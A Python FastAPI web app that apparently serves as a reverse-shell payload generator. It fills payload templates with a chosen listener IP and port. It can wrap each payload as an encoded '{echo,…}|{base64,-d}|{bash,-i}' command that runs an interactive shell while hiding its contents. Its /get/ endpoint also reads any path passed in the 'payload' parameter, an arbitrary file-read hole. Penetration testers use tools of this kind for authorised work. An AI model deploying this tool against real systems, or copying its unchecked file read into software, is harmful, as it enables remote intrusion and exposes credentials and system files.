from fastapi import FastAPI, Request, Form
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
from fastapi.responses import PlainTextResponse
from ipaddress import ip_address
from base64 import b64encode
from urllib.parse import quote
from pathlib import Path
from os.path import basename, dirname

app = FastAPI()
app.mount("/images", StaticFiles(directory="images"), name="images")
app.mount("/css", StaticFiles(directory="css"), name="css")
templates = Jinja2Templates(directory="templates")


def urlEncode(payload: str):
    return quote(payload)


def base64bash(payload: str):
    pl = b64encode(payload.encode('utf-8')).decode('utf-8')
    return f'{{echo,{pl}}}|{{base64,-d}}|{{bash,-i}}'


def getHelpers(ip: str, port: int):
    payload_template = templates.get_template('item.html')
    dir_template = templates.get_template('dir.html')
    processed = list()
    items = str()

    for path in Path('payloads').rglob('*'):
        if path.is_file():
            with open(path) as f:
                payload = f.read()
                payload = payload.replace('{{ip}}', ip)
                payload = payload.replace('{{port}}', str(port))
                href = f'get/?payload={f.name}&ip={ip}&port={port}'
                href_b64 = f'get/?payload={f.name}&ip={ip}' \
                    f'&port={port}&Base64bash=True'
                href_enc = f'get/?payload={f.name}&ip={ip}' \
                    f'&port={port}&URLEncoded=True'
                href_both = f'get/?payload={f.name}&ip={ip}' \
                    f'&port={port}&Base64bash=True&URLEncoded=True'
                category = basename(dirname(path))
                if category not in processed:
                    items += dir_template.render(dirname=category)
                    processed.append(category)
                items += payload_template.render(payload=payload,
                                         href=href, href_b64=href_b64, 
                                         href_enc=href_enc, href_both=href_both)

    return items


def isValidPortIP(ip: str, port: int):
    if port >= 0 and port < 65536:
        allowed = '0123456789.:'
        ip = ''.join(c for c in ip if c in allowed)
        try:
            ip_address(ip)
            return True
        except ValueError:
            pass

    return False


@app.get("/")
async def indexGet(request: Request):
    return templates.TemplateResponse("index.html",
                                      {"request": request, })


@app.post("/")
async def indexPost(request: Request, ip: str = Form(...),
                    port: int = Form(...)):
    if isValidPortIP(ip, port):
        items = getHelpers(ip, port)
        return templates.TemplateResponse("helpers.html",
                                          {"request": request,
                                           "items": items})
    msg = 'Invalid IP or Port specified'
    return templates.TemplateResponse("index.html",
                                      {"request": request,
                                       "msg": msg})


@app.get("/get/", response_class=PlainTextResponse)
async def get(payload: str, ip: str, port: int, 
                Base64bash: bool = False, URLEncoded: bool = False):
    path = Path.cwd() / payload
    payload = None
    if isValidPortIP(ip, port):
        if path.is_file():
            with open(path) as f:
                payload = f.read()
                payload = payload.replace('{{ip}}', ip)
                payload = payload.replace('{{port}}', str(port))
                if Base64bash is True:
                    payload = base64bash(payload)
                if URLEncoded is True:
                    payload = urlEncode(payload)

    return payload
